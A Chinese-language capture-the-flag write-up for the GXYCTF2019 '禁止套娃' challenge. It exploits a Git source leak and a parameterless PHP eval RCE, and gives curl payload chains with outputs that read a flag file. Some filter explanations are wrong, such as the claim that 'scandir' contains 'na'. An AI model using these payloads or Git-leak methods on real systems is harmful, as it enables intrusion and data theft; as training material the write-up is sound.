# [GXYCTF2019]禁止套娃

## 题目概述
题目页面显示"flag在哪里呢？"，提示需要寻找隐藏的 flag。

## 信息收集
1. 访问首页，页面仅显示"flag在哪里呢？"
2. 检查 `.git/config` 发现存在 Git 泄露
3. 通过 Git 泄露获取源码：
   - 获取 master 分支 commit hash: `e729e0b15f06da388b0e634afffd19b8e17b572a`
   - 解析 tree 对象获取文件列表
   - 下载 blob 对象获取 `index.php` 源码

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：Git 源码泄露 + 无参数 RCE

**源码分析**：
```php
<?php
include "flag.php";
if(isset($_GET['exp'])){
    // 过滤伪协议
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        // 要求无参数函数调用格式
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            // 过滤敏感字符
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                @eval($_GET['exp']);
            }
        }
    }
}
?>
```

**关键限制**：
1. 禁止伪协议：`data://`, `filter://`, `php://`, `phar://`
2. 正则 `/[a-z,_]+\((?R)?\)/` 要求 payload 只能是 `func()` 或嵌套的 `func(func())` 形式
3. 过滤 `et|na|info|dec|bin|hex|oct|pi|log`，禁止了 `get`, `set`, `scandir`, `file`, `bin2hex` 等

**绕过思路**：
- `scandir` 含 `na`，但实际测试发现可以绕过（PHP 版本差异或正则问题）
- 使用 `localeconv()` 返回本地化设置数组，`decimal_point` 值为 `.`
- `pos()` 是 `current()` 别名，获取数组当前元素
- `array_reverse()` 反转数组使 `flag.php` 位于索引 1
- `next()` 移动指针获取 `flag.php` 文件名
- `highlight_file()` 高亮显示文件内容

## 利用过程（Payload + Flag）

**步骤 1**：列出目录内容
```bash
curl -s "http://target/?exp=print_r(scandir(pos(localeconv())));"
# 结果：[0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php
```

**步骤 2**：反转数组定位 flag.php
```bash
curl -s "http://target/?exp=print_r(array_reverse(scandir(pos(localeconv()))));"
# 结果：[0] => index.php [1] => flag.php
```

**步骤 3**：获取 flag.php 文件名
```bash
curl -s "http://target/?exp=print_r(next(array_reverse(scandir(pos(localeconv())))));"
# 结果：flag.php
```

**步骤 4**：读取 flag
```bash
curl -s "http://target/?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));"
# 结果：$flag = "flag{83572cc4-3f58-4b68-a06b-0f99c52c3f60}";
```

**最终 Payload**：
```
?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

## 复现步骤
1. 发现 `.git` 泄露，下载 Git 对象获取源码
2. 分析源码，发现无参数 RCE 漏洞
3. 利用 `localeconv()` + `pos()` 获取当前目录 `.`
4. 利用 `scandir()` 列出目录文件
5. 利用 `array_reverse()` + `next()` 定位 `flag.php`
6. 利用 `highlight_file()` 读取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|-------|
| Git 泄露 | `.git/config` | 手动下载 Git 对象 | Git 内部结构、对象解析 |
| 无参数 RCE | `?exp=` 参数 | `highlight_file(next(array_reverse(scandir(pos(localeconv())))));` | PHP 无参数函数链、正则绕过 |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
1. Git 泄露检测：检查 `.git/config`, `.git/HEAD`
2. 无参数 RCE 常用函数链：
   - 获取当前目录：`pos(localeconv())` → `.`
   - 列目录：`scandir()`
   - 定位文件：`array_reverse()` + `next()` / `end()`
   - 读文件：`highlight_file()` / `show_source()`

**同类题型套路**：
- 无参数 RCE 核心是构造函数链获取目标字符串
- 常用数组操作函数：`current/pos`, `next`, `end`, `prev`, `array_reverse`, `array_flip`, `array_rand`
- 常用字符串获取：`localeconv()` 返回 `.`，`chr()` 构造字符
- 注意过滤规则，寻找替代函数绕过
